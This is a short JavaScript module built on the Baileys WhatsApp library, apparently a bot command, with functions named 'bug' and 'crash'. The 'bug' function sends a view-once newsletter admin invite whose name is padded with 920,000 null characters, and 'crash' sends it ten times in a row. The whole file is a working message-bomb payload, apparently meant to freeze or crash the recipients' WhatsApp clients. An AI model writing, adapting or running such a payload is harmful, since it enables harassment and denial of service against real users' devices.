import pkg from '@whiskeysockets/baileys';

const { proto, generateWAMessageFromContent } = pkg;

export async function bug(message, client) {

    const remoteJid = message.key.remoteJid;

    var messageContent = generateWAMessageFromContent(remoteJid, proto.Message.fromObject({

        'viewOnceMessage': {

            'message': {

                "newsletterAdminInviteMessage": {

                    "newsletterJid": `120363298524333143@newsletter`,

                    "newsletterName": "Dev Senku" + "\u0000".repeat(920000),

                    "jpegThumbnail": "",

                    "caption": `Dev Senku admin channel`,

                    "inviteExpiration": Date.now() + 1814400000
                }
            }
        }

    }), {

        'userJid': remoteJid
    });

    await  client.relayMessage(remoteJid, messageContent.message, {

        'participant': {

            'jid': remoteJid
        },
        'messageId': messageContent.key.id
    });

}

export async function crash(message, client) {

    for (let i = 0; i < 10; i++) {

            await bug(message, client);

            await new Promise(resolve => setTimeout(resolve, 2000));

        }
}

export default crash;